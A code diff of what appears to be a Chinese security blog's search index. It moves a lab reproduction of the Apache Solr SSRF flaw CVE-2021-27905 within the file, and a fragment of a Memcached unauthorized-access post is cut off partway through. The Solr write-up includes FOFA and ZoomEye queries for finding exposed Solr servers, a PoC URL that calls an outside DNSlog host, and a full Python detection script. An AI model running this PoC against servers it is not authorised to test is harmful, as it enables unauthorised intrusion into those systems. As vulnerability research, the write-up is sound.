@@ -66,6 +66,91 @@
       </tags>
   </entry>
   <entry>
+    <title>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</title>
+    <url>/2021/11/09/Apache%20Solr%20SSRF%20%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现"><a href="#Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现" class="headerlink" title="Apache Solr SSRF 漏洞(CVE-2021-27905)复现"></a>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</h1><hr>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
+<p>Apache Solr是一个开源的搜索服务，使用Java编写、运行在Servlet容器的一个独立的全文搜索服务器，是Apache Lucene项目的开源企业搜索平台。</p>
+<p>该漏洞是由于没有对输入的内容进行校验，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行SSRF攻击，最终造成任意读取服务器上的文件。影响版本为Apache Solr &lt;&#x3D; 8.8.1。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="http://archive.apache.org/dist/lucene/solr/8.8.1/">Apache Solr环境下载</a></p>
+<p>![image-20211115202638792](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115202638792.png)</p>
+<p>解压完成后，进入文件夹下的bin目录，在命令行中执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">solr start -p 8983</span><br></pre></td></tr></table></figure>
+
+<p>![image-20211115203019066](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203019066.png)</p>
+<p>在浏览器上访问8983端口，可以看到Solr</p>
+<p>![image-20211115203118220](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203118220.png)</p>
+<p>下面我们为Solr创建Core</p>
+<p>点击左边菜单栏的”Core Admin”选项，创建一个新的Core，发现上方出现报错信息。</p>
+<p>![image-20211115203546935](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203546935.png)</p>
+<p>我们来看下报错信息，如下:</p>
+<p>![image-20211115203923524](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203923524.png)</p>
+<p>提示没找到solrconfig.xml文件在配置文件中。</p>
+<p>我们进入Server文件夹下，可以看到new_core文件夹已经被创建成功。</p>
+<p>![image-20211115204058647](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204058647.png)</p>
+<p>这时，我们只需要把server&#x2F;solr&#x2F;configsets&#x2F;default文件夹下的conf目录整个拷贝到new_core文件夹下，就可以创建Core成功。</p>
+<p>![image-20211115204355418](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204355418.png)</p>
+<p>再次进行创建Core,成功创建</p>
+<p>![image-20211115204436984](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204436984.png)</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>搜索引擎查询</strong></p>
+<p>FOFA查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Zoomeye查询:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面开始对Solr进行漏洞探测.</p>
+<p>通过构造特定的URL访问Solr，可以看到上方创建的Core名字。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>
+
+<p>![image-20211115204811720](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204811720.png)</p>
+<p>solr 支持配置两个core，分别是主(master)和从(slave)，我们可以主动控制让从(slave)去获取主的备份，而master的地址在配置文件可以配置，也允许请求者指定。</p>
+<p>poc格式:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core（上面创建的Core）/replication?command=fetchindex&amp;maste rUrl=http://xxx</span><br></pre></td></tr></table></figure>
+
+
+
+<p>设置URL为DNSlog平台地址，可以看到返回200</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core/replication?command=fetchindex&amp;masterUrl=https://abc.53mliy.dnslog.cn/ss</span><br></pre></td></tr></table></figure>
+
+<p>![image-20211115211804407](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115211804407.png)</p>
+<p>在Dnslog平台上可以看到有请求响应</p>
+<p>![image-20211115211947915](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115211947915.png)</p>
+<p>这里提供一个poc脚本；</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CVE-2021-27905</span></span><br><span class="line"><span class="comment"># Apache solr ssrf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------------      Apache Solr SSRF漏洞      ---------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------               CVE-2021-27905               ----------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------use:python3 CVE-2021-27905.py -u url -d dnslog--------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------              Author:Henry4E36            ------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">commit</span>():</span></span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opt, agrs = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&quot;hu:d:&quot;</span>, [<span class="string">&quot;help&quot;</span>, <span class="string">&quot;url=&quot;</span>,<span class="string">&quot;dnslog=&quot;</span>])</span><br><span class="line">        <span class="keyword">for</span> op, value <span class="keyword">in</span> opt:</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&quot;-h&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--help&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            [-]   Apache Solr SSRF漏洞 (CVE-2021-27905)</span></span><br><span class="line"><span class="string">            [-]   Options:</span></span><br><span class="line"><span class="string">                     -h or --help      :   方法说明</span></span><br><span class="line"><span class="string">                     -u or --url       :   站点URL地址</span></span><br><span class="line"><span class="string">                     -d or --dnslog    :   DnsLog</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-u&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--url=&quot;</span>:</span><br><span class="line">                url = value</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-d&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--dnslog=&quot;</span>:</span><br><span class="line">                dnslog = value</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line">        <span class="keyword">return</span> url, dnslog</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target_core</span>(<span class="params">url</span>):</span></span><br><span class="line">    target_url = url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">        core = <span class="built_in">list</span>(json.loads(res.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> core</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>,e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf</span>(<span class="params">core,dnslog</span>):</span></span><br><span class="line">    target_url = url + <span class="string">f&quot;/solr/<span class="subst">&#123;core&#125;</span>/replication/?command=fetchindex&amp;masterUrl=http://<span class="subst">&#123;dnslog&#125;</span>&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        status = json.loads(res.text)[<span class="string">&quot;status&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> status == <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!]  33[31m目标系统: <span class="subst">&#123;url&#125;</span> 可能存在SSRF漏洞，请检查DNSLog响应！33[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[0]  目标系统: <span class="subst">&#123;url&#125;</span> 不存在SSRF漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    title()</span><br><span class="line">    url ,dnslog = commit()</span><br><span class="line">    core = target_core(url)</span><br><span class="line">    ssrf(core,dnslog)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用方法；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-27905.py -u URL(Solr地址) -d dnslog(dnslog生成地址)</span><br><span class="line"></span><br><span class="line">      -h or --help      :   方法说明</span><br><span class="line">      -u or --url       :   站点URL地址</span><br><span class="line">      -d or --dnslog    :   DnsLog</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们来运行一下该poc脚本:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">27905</span>.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8983</span> -d otettj.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p>提示目标系统可能存在SSRF漏洞</p>
+<p>![image-20211115213537111](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115213537111.png)</p>
+<p>我们查看DNslog平台,有DNS解析记录。</p>
+<p>![image-20211115213646434](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115213646434.png)</p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议受影响的用户升级到最新版本8.8.2</p>
+<p>Apache Solr 8.8.2官方下载地址</p>
+<p><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a></p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>Web容器漏洞</category>
+        <category>Apache</category>
+      </categories>
+      <tags>
+        <tag>-web漏洞 -Apache漏洞 -组件漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF练习-Web系列-SQLI（一）</title>
     <url>/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/</url>
     <content><![CDATA[<h1 id="CTF学习-Web系列（一）-Graphql注入"><a href="#CTF学习-Web系列（一）-Graphql注入" class="headerlink" title="CTF学习-Web系列（一）-Graphql注入"></a>CTF学习-Web系列（一）-Graphql注入</h1><h2 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h2><p><a href="http://10.0.25.109:20080/">http://10.0.25.109:20080/</a></p>
@@ -161,91 +246,6 @@
       </categories>
       <tags>
         <tag>-CTF -Web -Graphql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</title>
-    <url>/2021/11/09/Apache%20Solr%20SSRF%20%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现"><a href="#Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现" class="headerlink" title="Apache Solr SSRF 漏洞(CVE-2021-27905)复现"></a>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</h1><hr>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
-<p>Apache Solr是一个开源的搜索服务，使用Java编写、运行在Servlet容器的一个独立的全文搜索服务器，是Apache Lucene项目的开源企业搜索平台。</p>
-<p>该漏洞是由于没有对输入的内容进行校验，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行SSRF攻击，最终造成任意读取服务器上的文件。影响版本为Apache Solr &lt;&#x3D; 8.8.1。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="http://archive.apache.org/dist/lucene/solr/8.8.1/">Apache Solr环境下载</a></p>
-<p>![image-20211115202638792](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115202638792.png)</p>
-<p>解压完成后，进入文件夹下的bin目录，在命令行中执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">solr start -p 8983</span><br></pre></td></tr></table></figure>
-
-<p>![image-20211115203019066](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203019066.png)</p>
-<p>在浏览器上访问8983端口，可以看到Solr</p>
-<p>![image-20211115203118220](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203118220.png)</p>
-<p>下面我们为Solr创建Core</p>
-<p>点击左边菜单栏的”Core Admin”选项，创建一个新的Core，发现上方出现报错信息。</p>
-<p>![image-20211115203546935](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203546935.png)</p>
-<p>我们来看下报错信息，如下:</p>
-<p>![image-20211115203923524](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203923524.png)</p>
-<p>提示没找到solrconfig.xml文件在配置文件中。</p>
-<p>我们进入Server文件夹下，可以看到new_core文件夹已经被创建成功。</p>
-<p>![image-20211115204058647](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204058647.png)</p>
-<p>这时，我们只需要把server&#x2F;solr&#x2F;configsets&#x2F;default文件夹下的conf目录整个拷贝到new_core文件夹下，就可以创建Core成功。</p>
-<p>![image-20211115204355418](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204355418.png)</p>
-<p>再次进行创建Core,成功创建</p>
-<p>![image-20211115204436984](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204436984.png)</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>搜索引擎查询</strong></p>
-<p>FOFA查询：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Zoomeye查询:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>下面开始对Solr进行漏洞探测.</p>
-<p>通过构造特定的URL访问Solr，可以看到上方创建的Core名字。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>
-
-<p>![image-20211115204811720](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204811720.png)</p>
-<p>solr 支持配置两个core，分别是主(master)和从(slave)，我们可以主动控制让从(slave)去获取主的备份，而master的地址在配置文件可以配置，也允许请求者指定。</p>
-<p>poc格式:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core（上面创建的Core）/replication?command=fetchindex&amp;maste rUrl=http://xxx</span><br></pre></td></tr></table></figure>
-
-
-
-<p>设置URL为DNSlog平台地址，可以看到返回200</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core/replication?command=fetchindex&amp;masterUrl=https://abc.53mliy.dnslog.cn/ss</span><br></pre></td></tr></table></figure>
-
-<p>![image-20211115211804407](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115211804407.png)</p>
-<p>在Dnslog平台上可以看到有请求响应</p>
-<p>![image-20211115211947915](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115211947915.png)</p>
-<p>这里提供一个poc脚本；</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CVE-2021-27905</span></span><br><span class="line"><span class="comment"># Apache solr ssrf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------------      Apache Solr SSRF漏洞      ---------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------               CVE-2021-27905               ----------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------use:python3 CVE-2021-27905.py -u url -d dnslog--------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------              Author:Henry4E36            ------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">commit</span>():</span></span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opt, agrs = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&quot;hu:d:&quot;</span>, [<span class="string">&quot;help&quot;</span>, <span class="string">&quot;url=&quot;</span>,<span class="string">&quot;dnslog=&quot;</span>])</span><br><span class="line">        <span class="keyword">for</span> op, value <span class="keyword">in</span> opt:</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&quot;-h&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--help&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            [-]   Apache Solr SSRF漏洞 (CVE-2021-27905)</span></span><br><span class="line"><span class="string">            [-]   Options:</span></span><br><span class="line"><span class="string">                     -h or --help      :   方法说明</span></span><br><span class="line"><span class="string">                     -u or --url       :   站点URL地址</span></span><br><span class="line"><span class="string">                     -d or --dnslog    :   DnsLog</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-u&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--url=&quot;</span>:</span><br><span class="line">                url = value</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-d&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--dnslog=&quot;</span>:</span><br><span class="line">                dnslog = value</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line">        <span class="keyword">return</span> url, dnslog</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target_core</span>(<span class="params">url</span>):</span></span><br><span class="line">    target_url = url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">        core = <span class="built_in">list</span>(json.loads(res.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> core</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>,e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf</span>(<span class="params">core,dnslog</span>):</span></span><br><span class="line">    target_url = url + <span class="string">f&quot;/solr/<span class="subst">&#123;core&#125;</span>/replication/?command=fetchindex&amp;masterUrl=http://<span class="subst">&#123;dnslog&#125;</span>&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        status = json.loads(res.text)[<span class="string">&quot;status&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> status == <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!]  33[31m目标系统: <span class="subst">&#123;url&#125;</span> 可能存在SSRF漏洞，请检查DNSLog响应！33[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[0]  目标系统: <span class="subst">&#123;url&#125;</span> 不存在SSRF漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    title()</span><br><span class="line">    url ,dnslog = commit()</span><br><span class="line">    core = target_core(url)</span><br><span class="line">    ssrf(core,dnslog)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>使用方法；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-27905.py -u URL(Solr地址) -d dnslog(dnslog生成地址)</span><br><span class="line"></span><br><span class="line">      -h or --help      :   方法说明</span><br><span class="line">      -u or --url       :   站点URL地址</span><br><span class="line">      -d or --dnslog    :   DnsLog</span><br></pre></td></tr></table></figure>
-
-
-
-<p>我们来运行一下该poc脚本:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">27905</span>.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8983</span> -d otettj.dnslog.cn</span><br></pre></td></tr></table></figure>
-
-<p>提示目标系统可能存在SSRF漏洞</p>
-<p>![image-20211115213537111](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115213537111.png)</p>
-<p>我们查看DNslog平台,有DNS解析记录。</p>
-<p>![image-20211115213646434](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115213646434.png)</p>
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议受影响的用户升级到最新版本8.8.2</p>
-<p>Apache Solr 8.8.2官方下载地址</p>
-<p><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a></p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>Web容器漏洞</category>
-        <category>Apache</category>
-      </categories>
-      <tags>
-        <tag>-web漏洞 -Apache漏洞 -组件漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1075,317 +1075,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Memcached 未授权访问漏洞</title>
-    <url>/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="Memcached-未授权访问漏洞CVE-2013-7239"><a href="#Memcached-未授权访问漏洞CVE-2013-7239" class="headerlink" title="Memcached 未授权访问漏洞CVE-2013-7239"></a><strong>Memcached 未授权访问漏洞CVE-2013-7239</strong></h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>(1) 漏洞简述Memcached 是一套分布式高速缓存系统。它以 Key - Value<br>的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于<br>Memcached 的安全设计缺陷客户端连接 Memcached<br>服务器后无需认证就可读取、修改服务器缓存内容。</p>
-<p>(2) 风险等级高风险。</p>
-<p>(3) 漏洞编号CVE-2013-7239 。</p>
-<p>(4) 影响范围Memcached 全版本。</p>
-<h2 id="安装-Memcached"><a href="#安装-Memcached" class="headerlink" title="安装 Memcached"></a>安装 Memcached</h2><p>Linux系统安装memcached，首先要先安装libevent库。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libevent ibevent-dev     </span><br><span class="line">自动下载安装（Ubuntu/Debian）</span><br><span class="line"></span><br><span class="line">yum install libevent libevent-devel</span><br><span class="line">自动下载安装（Redhat/Fedora/Centos）</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="自动安装"><a href="#自动安装" class="headerlink" title="自动安装"></a>自动安装</h2><p><strong>Ubuntu&#x2F;Debian</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install memcached</span><br></pre></td></tr></table></figure>
-
-<p><strong>Redhat&#x2F;Fedora&#x2F;Centos</strong></p>
